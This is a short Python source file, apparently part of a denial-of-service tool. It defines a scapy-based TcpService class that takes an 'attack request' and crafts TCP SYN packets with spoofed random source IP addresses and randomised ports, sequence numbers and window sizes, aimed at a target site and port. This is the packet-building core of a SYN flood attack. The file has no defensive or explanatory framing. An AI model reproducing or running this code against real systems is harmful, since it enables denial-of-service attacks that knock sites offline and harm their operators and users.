from random import randint

from scapy.all import IP, TCP, Packet  # type: ignore
from shared.attacks import AttackRequest, BaseService
from shared.randoms import Random


class TcpService(BaseService):
    def __init__(self, attack_request: AttackRequest) -> None:
        super().__init__(attack_request=attack_request)
        self._flags = ["S"]
        self.__target_address = self._get_site_address()

    def craft_syn_packet(self) -> Packet:
        ip_packet = IP()
        ip_packet.src = Random.get_ip()
        ip_packet.dst = self.__target_address

        tcp_packet = TCP()
        tcp_packet.sport = randint(1000, 10000)
        tcp_packet.dport = self._attack_request.target.port
        tcp_packet.flags = self._flags
        tcp_packet.seq = randint(1000, 10000)
        tcp_packet.window = randint(1000, 10000)

        return ip_packet / tcp_packet
